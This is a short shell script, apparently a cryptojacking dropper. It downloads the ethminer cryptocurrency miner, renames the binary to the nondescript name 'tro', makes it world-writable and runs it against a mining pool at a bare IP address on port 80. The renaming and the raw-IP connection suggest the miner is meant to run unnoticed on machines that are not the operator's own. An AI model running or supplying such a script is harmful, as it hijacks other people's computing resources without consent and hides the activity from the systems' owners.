wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz -O out
tar -xvf out
mv bin/ethminer bin/tro
chmod 777 bin/tro
bin/tro -P http://79.231.42.249:80
